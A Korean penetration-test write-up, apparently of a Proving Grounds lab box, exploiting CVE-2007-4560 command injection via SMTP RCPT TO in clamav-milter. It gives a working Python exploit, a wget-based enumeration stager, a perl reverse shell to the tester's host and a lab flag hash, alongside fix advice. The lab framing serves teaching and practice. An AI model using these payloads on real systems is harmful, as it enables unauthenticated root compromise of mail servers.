---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/smtp
  - tech/web/cmd-injection
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.42
domain: 0xbabe.local
ports: [22, 25, 80, 139, 199, 445, 60000]
services: [http, netbios-ssn, smtp, smux, ssh]
cves: [CVE-2007-4560]
status: solved
manual_tags: true
manual_cves: true
tech_count: 3
---

> [!info] 요약
> 타겟 `192.168.248.42` · Linux (Debian sarge · 커널 2.6.8-4-386 · 호스트명 `0xbabe.local`) · Fundamental · 플래그 1개(`/root/proof.txt`)
> 진입점: tcp/25 Sendmail 8.13.4 뒤에 clamav-milter 0.91 이 `--black-hole-mode` 로 붙어 있음 → SMTP `RCPT TO:` 의 local-part 에 명령 주입(CVE-2007-4560) → perl 리버스셸
> 권한상승: 없음 — milter 가 root 로 구동돼 최초 실행 시점부터 uid=0
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.42

### Initial Access – SMTP 수신자 주소에 넣은 셸 메타문자가 clamav-milter 의 popen 을 타고 root 명령 실행이 됨

**Vulnerability Explanation:** clamav-milter 0.91 이 `--black-hole-mode` 로 구동 중임(CVE-2007-4560).
- 이 모드는 「수신자 메일함이 어차피 `/dev/null` 이면 검사 비용을 아끼자」는 최적화라, 배달 방식을 알아내려 `sendmail -bv <수신자>` 를 **`popen` 으로** 실행함
- 수신자 주소가 셸 명령줄에 문자열로 이어붙으므로 `RCPT TO:` 의 셸 메타문자가 그대로 셸로 흐름 — 인증 불필요, 취약 범위는 0.91.2 미만
- milter 프로세스가 root 로 돌아 주입 즉시 uid=0. 권한상승 단계가 존재하지 않음

**Vulnerability Fix:**
- clamav-milter 를 0.91.2 이상으로 올릴 것. 불가하면 black hole 모드를 끌 것 — 이 결함은 그 모드에서만 남
- milter 를 root 가 아닌 `clamav` 전용 계정으로 구동할 것. 그랬다면 명령 주입이 나도 uid=0 은 안 됨
- 외부 입력을 셸 문자열에 이어붙여 `popen` 하지 말 것. 인자 배열로 `execve` 하면 이 결함은 성립하지 않음
- Debian sarge · Apache 1.3.33 · Samba 3.0.14a 는 전부 EOL 임. 스택 자체를 교체할 것

**Severity:** Critical — 무인증 원격 명령 실행이 곧바로 root

**Steps to reproduce the attack:**
1. tcp/25 에 `MAIL FROM: <>` → `RCPT TO: <nobody+":cmd;"@localhost>` 로 인용 local-part 가 `250 Recipient ok` 를 받는지 확인
2. DATA 본문에 EICAR 를 실어 `.` 을 보내고 `554 … detected by ClamAV` 로 AV milter 존재 확인
3. `RCPT TO: <nobody+"|/usr/bin/wget http://<LHOST>/PROBE1"@localhost>` 로 Kali HTTP 서버를 오라클 삼아 RCE 확정
4. 인벤토리 스크립트를 내려받아 **상대경로**로 실행 — `uid=0` 과 가용 도구(perl 만 존재) 회수
5. perl 리버스셸 스테이저를 내려받고(1회) 상대경로로 실행(1회) — 두 메시지로 분리
6. tcp/4444 리스너에서 root 대화형 셸 수신 후 `/root/proof.txt` 읽기

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.42 | TCP: 22, 25, 80, 139, 199, 445, 60000 |

```bash
ssh kali@10.44.44.128 "cd ~/PG/ClamAV && nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.42"
```

```text
# Nmap 7.98 scan initiated Thu Aug 20 14:22:36 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.42
Nmap scan report for 192.168.248.42
Host is up (0.086s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.207], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-title: Ph33r
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
445/tcp   open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
```
— 출처: `~/PG/ClamAV/nmap.log` (OS 지문·traceroute·SMB 호스트 스크립트는 잘랐음. 원문 전량 보존)

읽을 것이 셋임.

`sarge` · `Apache 1.3.33` · `Sendmail 8.13.4` 는 전부 Debian 3.1(2005) 라인임. 이 정도로 오래된 스택이면 개별 CVE 를 뒤지기 전에 **박스가 이름을 걸고 있는 서비스**부터 행동으로 확인하는 쪽이 빠름.

**60000/tcp 는 22/tcp 와 ssh-hostkey 지문이 동일함.** 같은 sshd 가 두 포트에 물려 있을 뿐이고 별개 서비스가 아님. 호스트키 지문 대조가 「포트가 여럿인데 같은 데몬인가」를 판정하는 가장 싼 방법임. `-p-` 를 안 붙였으면 이 줄은 못 봤음 — top-200(`quick.log`, 1.03초)과 전 포트(74.5초)의 차이가 정확히 이 한 줄이었음. 결과적으로 경로와는 무관했음.

`clock-skew` 는 `median: 3h59m59s`. 타겟 시계가 4시간 앞서 있어 셸의 `date` 가 Kali 시각과 안 맞음(2008년대 Debian 이라 NTP 미가동). 증거 화면의 시각이 이상해 보이면 이것부터 의심할 것.

**버전 판정 — 독립 근거 2개가 서로 어긋남**

⚠️ 이 절의 두 블록은 **셸을 잡은 뒤(14:35 이후) 확인한 값**임. 정찰 시점에는 알 수 없었고, 여기 두는 것은 버전 판정 근거를 한자리에 모으기 위함임.

```text
sh-2.05b# dpkg -l 2>/dev/null | grep -i clam; ps aux | grep -i clamav | grep -v
grep; grep -i milter /etc/mail/sendmail.mc 2>/dev/null; grep -i -A3 blackhole /e
tc/clamav/clamav-milter.conf 2>/dev/null; ls /etc/default/ | grep -i clam
ii  clamav         0.84-2.sarge.1 antivirus scanner for Unix
ii  clamav-base    0.84-2.sarge.1 base package for clamav, an anti-virus utili
ii  clamav-freshcl 0.84-2.sarge.1 downloads clamav virus databases from the In
ii  libclamav1     0.84-2.sarge.1 virus scanner library
root      3778  0.0 11.0 71396 28344 ?       Ss   05:19   0:00 /usr/local/sbin/c
lamav-milter --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
INPUT_MAIL_FILTER(`clmilter',`S=local:/var/run/clamav/clamav-milter.ctl,F=, T=S:
4m;R:4m')dnl
define(`confINPUT_MAIL_FILTERS', `clmilter')
sh-2.05b# clear; /usr/local/sbin/clamav-milter --version; ls -la /usr/local/sbin
/
ClamAV version 0.91, clamav-milter version 0.91
total 504
drwxrwsr-x   2 root staff   4096 Jan 21  2009 .
drwxrwsr-x  10 root staff   4096 Jan 21  2009 ..
-rwxr-xr-x   1 root staff 202166 Jan 21  2009 clamav-milter
-rwxr-xr-x   1 root staff 291307 Jan 21  2009 clamd
```
— 출처: `~/PG/ClamAV/shell_session.log`

- **`dpkg -l` = 0.84-2.sarge.1** — APT 로 깔린 패키지
- **실행 바이너리 `--version` = 0.91** — `/usr/local/sbin/clamav-milter`, 소스 빌드가 `/usr/local` 에 얹혀 있음

두 값이 다름. CVE-2007-4560 의 취약 범위는 `before 0.91.2` 라서 **`dpkg` 만 봤으면 「0.84 는 범위 밖」으로 잘못 배제**했을 자리임. `ps aux` 로 실행 경로를 보고 그 바이너리에 `--version` 을 물어야 맞는 값이 나옴.

같은 블록에서 익스플로잇 조건 셋이 전부 확인됨 — 버전 0.91(< 0.91.2) · `--black-hole-mode` 켜짐 · 실행 사용자 root. 마지막 항목이 이 박스에 권한상승 절이 없는 이유임.

**서비스 식별 — 이름이 아니라 행동으로 판정함**

박스 이름이 ClamAV 인데 nmap 은 ClamAV 를 한 줄도 안 보여줌. clamd(3310)도 milter 소켓도 TCP 로 노출돼 있지 않음. 이름을 근거로 파는 것은 [[Cockpit]] 에서 하루를 태운 함정이라, 서비스가 실제로 그렇게 «행동»하는지를 봐야 했음.

먼저 던진 것은 EICAR 가 아니라 **주소 문법 테스트**였음. 인용된 local-part 에 셸 메타문자를 넣었을 때 sendmail 이 받아주는지부터 확인한 것임.

```text
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Thu, 20 Aug 2026 05:23:33 -0400; (No UCE/UBE) logging access from: [192.168.45.207](FAIL)-[192.168.45.207]
250 localhost.localdomain Hello [192.168.45.207], pleased to meet you
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+":/bin/touch /tmp/clamtest;"@localhost>... Recipient ok
221 2.0.0 localhost.localdomain closing connection
```
— 출처: `~/PG/ClamAV/smtp_probe1.txt` (14:23:33)

`250 Recipient ok` 회신. 다만 여기서 `DATA` 를 안 보내고 QUIT 했으므로 **명령은 실행되지 않았음** — milter 는 메시지 본문 단계에 가야 돎. 주소가 받아들여졌다는 것만 확인한 셈임.

**tcp/80 과 SMB — 셸을 잡은 뒤에 본 것임**

⚠️ 아래 두 블록의 산출물 mtime 은 14:42~14:44 임. root 획득이 14:35 이므로 정찰이 아니라 사후 확인이었음. 경로에는 기여하지 않았고 기록으로만 남김.

```bash
ssh kali@10.44.44.128 "curl -s -i http://192.168.248.42/ > ~/PG/ClamAV/http_root.txt"
```

```text
HTTP/1.1 200 OK
Date: Thu, 20 Aug 2026 09:42:19 GMT
Server: Apache/1.3.33 (Debian GNU/Linux)
Last-Modified: Thu, 22 Jan 2009 01:57:56 GMT
ETag: "660ee-121-4977d2a4"
Accept-Ranges: bytes
Content-Length: 289
Content-Type: text/html; charset=iso-8859-1

<html>
<head><title>Ph33r</title></head>
<body>
<center>
<p></p>
<p>01101001 01100110 01111001 01101111 01110101 01100100 01101111 01101110 01110100 01110000 01110111 01101110 01101101 01100101 01110101 01110010 01100001 01101110 00110000 0011
0000 01100010
</p>
</center>
</body>
</html>
```
— 출처: `~/PG/ClamAV/http_root.txt`

0/1 만 골라 8비트씩 끊어 디코드한 결과:

```text
bits 168
ifyoudontpwnmeuran00b
```
— 출처: `~/PG/ClamAV/web_binary_decoded.txt`

168비트 = 21바이트. 자격증명이 아니라 도발 문구임. 여기서 파봐야 나오는 것이 없음.

```text
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
	ADMIN$          IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------
	0XBABE               0xbabe server (Samba 3.0.14a-Debian) brave pig

	Workgroup            Master
	---------            -------
	WORKGROUP            0XBABE
```
— 출처: `~/PG/ClamAV/smb_shares.txt` (`smbclient -L //192.168.248.42 -N`)

읽을 만한 공유가 없음. Samba 3.0.14a 자체가 오래된 버전이라 별도 경로가 있을 수 있으나 **이 박스에서는 시도하지 않았음**(배제가 아니라 미완).

### Initial Access – RCPT TO 명령 주입 → perl 리버스셸

**익스플로잇 스크립트**

인자로 받은 명령을 `RCPT TO:` 에 넣고, DATA 본문에 EICAR 를 실어 milter 를 확실히 태움.

```python
#!/usr/bin/env python3
import socket, sys, time

TARGET = "192.168.248.42"
CMD = sys.argv[1] if len(sys.argv) > 1 else "/usr/bin/wget http://192.168.45.207/probe-$(id -u)"

lines = [
    "HELO x",
    "MAIL FROM: <>",
    'RCPT TO: <nobody+"|%s"@localhost>' % CMD,
    "DATA",
    "Subject: test",
    "",
    "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
    ".",
    "QUIT",
]

s = socket.create_connection((TARGET, 25), 15)
s.settimeout(3)
```
— 출처: `~/PG/ClamAV/clamex.py` (이하 recv 루프. 전문은 산출물 참조)

주소 형태 `<nobody+"|<명령>"@localhost>` 는 임의로 만든 것이 아니라 **이 CVE 의 표준형**임. Metasploit 모듈(`exploit/unix/smtp/clamav_milter_blackhole`)도 `<nobody+"|sh msg*"@localhost>` 를 만듦. 조각별로:

- `nobody+` — 존재하는 로컬 사용자 + `+detail` 형태. sendmail 이 주소를 정상 파싱해 `250 Recipient ok` 를 주게 하는 껍데기. `smtp_probe1.txt` 에서 확인함
- `"..."` — local-part 인용. 둘을 동시에 함. SMTP 주소 문법상 공백·`/`·`;` 를 local-part 에 넣으려면 인용이 필요하고, 동시에 이 따옴표가 `popen` 문자열 안에서 셸의 인용을 여닫아 뒤의 `|` 를 셸이 해석하는 위치로 만듦. `[가정]` — 인용 없이 보내면 어떻게 되는지는 이 박스에서 시험하지 않았음
- `|` — `popen` 이 넘긴 문자열 안의 셸 파이프임. sendmail 의 프로그램 배달(`|command` 별칭)이 아님
- `@localhost` — 로컬 배달로 잡히게 하는 도메인부

EICAR 문자열의 `\P` 때문에 파이썬이 매 실행마다 `SyntaxWarning: invalid escape sequence '\P'` 를 뱉음. 모든 `try*.log` 첫 줄에 찍힌 것이 그것이고 동작에는 영향 없음. 원문 그대로 둠.

`[가정]` — `settimeout` 값을 도중에 줄인 것으로 보임. `clamex.py` mtime 이 try3(14:27:57)과 try4(14:29:02) 사이인 **14:28:42** 이고, try3 로그가 `354 Enter mail` 에서 끊겨 `.` 을 못 보낸 형태임. 수정 «내용»이 무엇이었는지는 산출물로 확정 불가(수정 전 사본 없음). 확실한 것은 try3 이 `.` 전에 죽어 **명령이 아예 실행되지 않았다**는 것 — 그 시각대에 Kali HTTP 로그에 `GET /p.sh` 가 없음.

DATA 본문에 EICAR 를 넣은 것은 milter 를 반드시 통과시키려는 의도였음. **EICAR 없이도 되는지는 시험하지 않았음.**

**1단계 — 실행되는지부터 확인(블라인드 RCE 오라클)**

명령 결과가 화면에 안 돌아옴. 그래서 처음부터 「실행됐는지」를 밖에서 볼 수 있는 명령을 골랐음 — Kali 에 HTTP 서버를 띄우고 타겟이 그것을 긁게 만들면 액세스 로그가 곧 증거임.

```bash
ssh kali@10.44.44.128 "tmux new-session -d -s clamav_http 'cd ~/PG/ClamAV/www && sudo python3 -m http.server 80; exec bash'"
ssh kali@10.44.44.128 "cd ~/PG/ClamAV && python3 clamex.py '/usr/bin/wget http://192.168.45.207/PROBE1'"
```

```text
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Thu, 20 Aug 2026 05:24:30 -0400; (No UCE/UBE) logging access from: [192.168.45.207](FAIL)-[192.168.45.207]
>>> HELO x
250 localhost.localdomain Hello [192.168.45.207], pleased to meet you
>>> MAIL FROM: <>
250 2.1.0 <>... Sender ok
>>> RCPT TO: <nobody+"|/usr/bin/wget http://192.168.45.207/PROBE1"@localhost>
250 2.1.5 <nobody+"|/usr/bin/wget http://192.168.45.207/PROBE1"@localhost>... Recipient ok
>>> DATA
354 Enter mail, end with "." on a line by itself
>>> Subject: test
>>> 
>>> X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
>>> .
554 5.7.1 virus Eicar-Test-Signature detected by ClamAV - http://www.clamav.net
>>> QUIT
221 2.0.0 localhost.localdomain closing connection
```
— 출처: `~/PG/ClamAV/try1.log`

```text
192.168.248.42 - - [20/Aug/2026 14:25:18] "GET /probe1 HTTP/1.0" 404 -
```
— 출처: `~/PG/ClamAV/http_stager.log`

이 한 번에 셋이 나왔음.

- `554 … Eicar-Test-Signature detected by ClamAV` — 배너에 없어도 **행동이** ClamAV milter 의 존재를 증명함
- `GET /probe1` — RCE 확정. 동시에 아웃바운드 tcp/80 이 열려 있음
- **함정 하나** — 보낸 것은 `PROBE1` 인데 요청은 `probe1` 임. **명령이 소문자로 접혀 실행됨.** 대문자가 필요한 옵션(`wget -O`, `curl -O`, `nc -N`)은 이 채널로 못 보냄

메일이 `554` 로 거절됐는데도 명령은 돌았음. **거절 응답은 실행 실패를 뜻하지 않음**([[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]]).

**2단계 — 타겟에 뭐가 있는지 알아냄**

리버스셸을 짜기 전에 도구 유무부터 봤음. 결과를 URL 경로에 실어 되돌려 받는 방식임.

```sh
#!/bin/sh
W=/usr/bin/wget
U=http://192.168.45.207
$W $U/uid=$(id -u)-$(id -un)
for b in perl nc netcat python telnet bash socat mkfifo; do
  p=$(which $b 2>/dev/null | tr / _)
  $W "$U/bin-$b=${p:-none}"
done
```
— 출처: `~/PG/ClamAV/www/d.sh`

`tr / _` 는 경로의 `/` 가 URL 경로 구분자로 먹혀 값이 갈라지는 것을 막음.

```text
"GET /uid=0-root HTTP/1.0" 404 -
"GET /bin-perl=_usr_bin_perl HTTP/1.0" 404 -
"GET /bin-nc=none HTTP/1.0" 404 -
"GET /bin-netcat=none HTTP/1.0" 404 -
"GET /bin-python=none HTTP/1.0" 404 -
"GET /bin-telnet=_usr_bin_telnet HTTP/1.0" 404 -
"GET /bin-bash=_bin_bash HTTP/1.0" 404 -
"GET /bin-socat=none HTTP/1.0" 404 -
"GET /bin-mkfifo=_usr_bin_mkfifo HTTP/1.0" 404 -
```
— 출처: `~/PG/ClamAV/http_stager.log` (14:32:03~04)

`uid=0-root` — 이 시점에 이미 게임이 끝났음. 그리고 `nc`·`python`·`socat` 이 전부 없고 **perl 만 있음.**

**채널 제약 셋 — 페이로드 모양이 여기서 결정됨**

RCE 확정(14:25:19)에서 셸(14:35:31)까지 **10분 12초**가 걸렸고, 그중 앞의 약 7분(14:25~14:32)이 이 셋을 몰라서 생긴 것임. 재현에 필요한 만큼만 여기 적고, 계측 원장과 일반화는 [[_PLAYBOOK]] 에 있음.

| 제약 | 관측 | 재현에 미치는 영향 |
|---|---|---|
| **소문자 접힘** | `PROBE1` → `GET /probe1` | 대문자 옵션(`-O`) 사용 불가 |
| **93자 절단** | 105자짜리 try7 에서 67번째 문자에서 시작하는 세 번째 명령이 실행 안 됨(`GET /aaa` 만 도착, `GET /zzz` 없음) | 한 메시지에 한 단계씩만 — 내려받기 41자, 실행 20자 |
| **`cd` 무효 + cwd 가 `/tmp` 가 아님** | 내려받은 파일이 전부 `/tmp/clamav-10d082f2f822edaf614bdaa9fd69fb6c/` 에 떨어짐. `/tmp/x.sh` 는 존재한 적 없음 | 실행은 반드시 **상대경로** `x.sh` |

세 번째가 결정적임. clamav-milter 는 `/tmp/clamav-<hash>/` 를 만들고 **그 디렉터리가 프로세스의 작업 디렉터리**이며 메시지 본문을 `msg.XXXXXX` 로 거기 씀(Metasploit 모듈 주석). 모듈 페이로드가 `sh msg*` 라는 상대경로인 이유가 그것임. 이것을 모르고 `/tmp/x.sh` 를 쓰면 **조용히 아무 일도 안 일어남.**

```text
sh-2.05b# clear; find / -maxdepth 4 \( -name "d.sh*" -o -name "q.sh*" -o -name "
p.sh*" -o -name "s.sh*" \) 2>/dev/null; echo ---PWD---; ls -la /var/lib/clamav 2
>/dev/null | head
/tmp/clamav-10d082f2f822edaf614bdaa9fd69fb6c/s.sh
/tmp/clamav-10d082f2f822edaf614bdaa9fd69fb6c/p.sh
/tmp/clamav-10d082f2f822edaf614bdaa9fd69fb6c/d.sh
/tmp/clamav-10d082f2f822edaf614bdaa9fd69fb6c/q.sh
```
— 출처: `~/PG/ClamAV/shell_session.log` (`---PWD---` 이후의 `/var/lib/clamav` 목록은 잘랐음)

남은 약 3분(14:32~14:35)은 채널 제약이 아님. 상대경로가 통한 뒤에도 perl→**443** 리버스셸이 세 번 연속 안 붙었고, 스크립트를 그대로 두고 **포트만 4444 로 바꾸자 한 번에 붙었음**. `[가정]` — 앞서 443 확인용으로 보낸 wget 이 메일 큐에 남아 재배달되며 리스너를 먼저 소모한 것으로 봄(그 시점의 443 리스너 로그가 없어 인과는 미확정). **방화벽 문제는 아니었음** — 아웃바운드 80·443·4444 모두 도달 기록이 있음(`http_stager.log`·`listener443.log`·`shell_session.log`). 상세는 [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]].

**3단계 — perl 리버스셸**

```sh
#!/bin/sh
/usr/bin/perl -e 'use Socket;$i="192.168.45.207";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
— 출처: `~/PG/ClamAV/www/q.sh`

셸 코드를 SMTP 주소에 직접 넣지 않고 **파일로 내려받아 실행**함. 주소 필드에 93자 상한과 소문자 접힘이 걸려 있어 긴 페이로드는 그 길로 못 보냄.

```bash
ssh kali@10.44.44.128 "tmux new-session -d -s clamav_l4444 'rlwrap nc -lvnp 4444; exec bash'"
ssh kali@10.44.44.128 "cd ~/PG/ClamAV && python3 clamex.py 'cd /tmp;/usr/bin/wget 192.168.45.207/q.sh'"
ssh kali@10.44.44.128 "cd ~/PG/ClamAV && python3 clamex.py 'cd /tmp;/bin/sh q.sh'"
```

두 번째가 `/tmp/q.sh` 가 아니라 **상대경로 `q.sh`** 인 것이 핵심임(「채널 제약 셋」 표 3행). `cd /tmp` 는 어차피 무시되므로 접두어로 남아 있어도 무해함.

```text
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.42] 32833
sh: no job control in this shell
sh-2.05b# whoami; id; hostname; date; uname -a; ls -la /root /home
root
uid=0(root) gid=0(root)
0xbabe.local
Thu Aug 20 05:35:45 EDT 2026
Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686 GNU/Linux
/home:
total 12
drwxrwsr-x   3 root staff 4096 Jan 19  2009 .
drwxr-xr-x  21 root root  4096 Mar 20  2020 ..
drwxr-xr-x   2 1000  1000 4096 Jan 19  2009 ryu

/root:
total 36
drwxr-xr-x   4 root root 4096 Aug 20 01:18 .
drwxr-xr-x  21 root root 4096 Mar 20  2020 ..
drwx------   2 root root 4096 Jan 20  2009 .aptitude
-rw-------   1 root root    0 Jul  3  2020 .bash_history
-rw-r--r--   1 root root  412 Dec 15  2004 .bashrc
-rw-r--r--   1 root root  110 Nov 10  2004 .profile
drwxr-xr-x   2 root root 4096 Sep 26  2010 .ssh
-rw-r--r--   1 root root  173 Nov  9  2005 dbootstrap_settings
-rw-r--r--   1 root root 1336 Nov  9  2005 install-report.template
-rw-r--r--   1 root root   33 Aug 20 05:19 proof.txt
```
— 출처: `~/PG/ClamAV/shell_session.log`

`sh-2.05b#` — `#` 이므로 root 임. perl 이 `exec("/bin/sh -i")` 로 넘겨준 **대화형 셸**이고 웹셸이 아님.

`date` 가 `05:35:45 EDT` 인데 이것을 친 Kali 쪽 시각은 14:35 KST(= 01:35 EDT)임. 타겟 시계가 4시간 앞서 있고 nmap 의 `clock-skew median: 3h59m59s` 가 같은 것을 말함.

`/root/.ssh` 가 있으므로 지속 접근을 원했으면 키를 심을 자리가 있었음(하지 않았음). `/home/ryu` 는 `.bash_profile`·`.bashrc` 뿐임.

**수동 대안** — 시험 규정상 Metasploit 은 1대 한정이므로 손으로 되는 것은 손으로 할 것. `clamex.py` 는 30줄이고, `nc <타겟> 25` 로 직접 쳐도 됨:

```text
HELO x
MAIL FROM: <>
RCPT TO: <nobody+"|<명령>"@localhost>
DATA
.
```

**Local.txt value:**
**없음** — 이 박스는 플래그가 `/root/proof.txt` 하나뿐임. 근거 둘 — ① 셸에서 `find / -name local.txt 2>/dev/null` 가 0건이었고 `NOLOCAL-DONE` 마커로 완주가 확인됨 ② 포털 표기가 `0/1` 임. `Post-Exploitation` 절의 회수 화면이 그대로 user 증명도 겸함(최초 실행 시점부터 uid=0 이라 저권한 단계 자체가 없음).

```text
sh-2.05b# whoami; id; hostname; /sbin/ifconfig eth0 | head -3; date; cat /root/p
roof.txt; ls -la /home/ryu; find / -name local.txt 2>/dev/null; echo NOLOCAL-DON
E
root
uid=0(root) gid=0(root)
0xbabe.local
eth0      Link encap:Ethernet  HWaddr 00:50:56:AB:37:E4
          inet addr:192.168.248.42  Bcast:192.168.248.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feab:37e4/64 Scope:Link
Thu Aug 20 05:35:57 EDT 2026
9e16b9729fc839292f26d8d0b1e0d89f
total 16
drwxr-xr-x  2 1000  1000 4096 Jan 19  2009 .
drwxrwsr-x  3 root staff 4096 Jan 19  2009 ..
-rw-r--r--  1 1000  1000  567 Jan 19  2009 .bash_profile
-rw-r--r--  1 1000  1000 1834 Jan 19  2009 .bashrc
NOLOCAL-DONE
```
— 출처: `~/PG/ClamAV/shell_session.log` (14:35:57)

### Privilege Escalation – 없음 (milter 가 root 로 구동돼 최초 실행 시점부터 uid=0)

권한상승 단계가 존재하지 않음. 근거는 `Service Enumeration` 의 `ps aux` 줄 — `root 3778 … /usr/local/sbin/clamav-milter --black-hole-mode …` 이고, 그 프로세스가 `popen` 한 명령이 그대로 uid=0 으로 돎. 첫 인벤토리 회신이 `GET /uid=0-root` 였던 것이 그 실측임.

> [!warning] 뚫자마자 root 일 수도 있다
> `id` 를 먼저 확인하지 않고 `sudo -l`·SUID 를 뒤졌다면 시간을 버렸을 것임. 순서는 항상 `id` 가 먼저. 데몬이 root 로 도는 구식 스택에서는 흔함.

### Post-Exploitation

**Proof.txt value:**
`9e16b9729fc839292f26d8d0b1e0d89f`

시험 증거 형식대로 한 화면에 담은 것(흔적 정리를 끝낸 뒤 14:41):

```text
sh-2.05b# clear; whoami; id; hostname; /sbin/ifconfig eth0 | grep "inet addr"; d
ate; cat /root/proof.txt
root
uid=0(root) gid=0(root)
0xbabe.local
          inet addr:192.168.248.42  Bcast:192.168.248.255  Mask:255.255.255.0
Thu Aug 20 05:41:47 EDT 2026
9e16b9729fc839292f26d8d0b1e0d89f
sh-2.05b#
```
— 출처: `~/PG/ClamAV/proof.txt`

`ip a` 대신 `/sbin/ifconfig` 를 쓴 것은 sarge 시절 박스에서 `ip` 가 없거나 PATH 밖일 가능성이 커서임. `[가정]` — 이 박스에서 `ip a` 를 실제로 쳐보지는 않았음.

> [!warning] 이 해시는 2026-08-20 인스턴스의 값이다
> PG 는 박스를 리버트하거나 다시 켤 때마다 플래그를 새로 만듦([[Flu]] 에서 두 인스턴스가 서로 다른 값을 냈음). 다음에 이 박스를 켜면 `9e16b972…` 는 안 맞음. 값을 외우지 말고 경로(`/root/proof.txt`)와 재현 절차를 외울 것.

**스크린샷** — 없음. 이 박스는 정지된 뒤에 개작한 소급 노트이고, 볼트 `파일보관\` 에 `PG-ClamAV-*` 도 2026-08-20 자 `Pasted image …` 도 0장임. 정지 뒤에는 되살릴 방법이 없음.

**남긴 흔적**

타겟(192.168.248.42)에서 직접 확인하고 지운 것:
- `/tmp/clamav-10d082f2f822edaf614bdaa9fd69fb6c/` 의 `s.sh`·`p.sh`·`d.sh`·`q.sh` — 업로드한 스테이저 4개. `rm` 후 `ls` 로 빈 것 확인
- 같은 디렉터리의 `msg.UwrIn0`·`msg.bALJGx`·`msg.ltbt6h` — 보낸 메일 본문. 삭제 확인
- `/var/spool/mqueue/df67K9Q1G9004135`·`df67K9Spbp004144`·`df67K9TFC6004151` — 큐에 남아 재배달되던 익스플로잇 메시지. 삭제 후 큐가 빈 것 확인

지우지 않은 것:
- `/var/mail/root` (2670바이트, mtime 이 작업 시각) — 메일 시도로 생긴 바운스가 들어 있음. root 메일함 자체를 지우는 것은 원상복구가 아니라 파괴라 그대로 둠
- 설정 변경·계정 생성·백도어 없음

Kali(10.44.44.128) 쪽:
- tmux `clamav_*` 세션 전부 종료 확인. 80/443/4444 리스너 없음(`ss -lntp`)
- `[가정]` — 작업 종료 시점에 타겟이 `Destination Host Unreachable` 이었다는 기록이 원본 노트에 있으나 해당 산출물이 없음. 확실한 것은 **박스가 정지돼 재접속이 불가**하고, 다시 켜면 플래그 값이 바뀐다는 것뿐임
- 산출물: `~/PG/ClamAV/` — `nmap.log`·`nmap.full.txt`·`nmap_tmux.log`·`quick.log`·`svc.log`·`smtp_probe1.txt`·`clamex.py`·`www/{s,p,d,q}.sh`·`try1`~`try17`·`http_stager.log`·`listener443.log`·`shell_session.log`·`proof.txt`·`http_root.txt`·`web_binary_decoded.txt`·`smb_shares.txt`
- **저장하지 못한 것**: try15~17(14:37~14:39)을 덮는 HTTP 서버 로그. `http_stager.log` 는 내용이 14:34:53(`GET /q.sh`)에서 끝나는데 파일 mtime 은 14:36:20 — 실시간 추가 기록이 아니라 tmux 페인을 한 번 떠낸 스냅샷임. 그 이후 요청이 통째로 없어 93자 절단의 직접 계측치는 재확인 불가임

## 관련

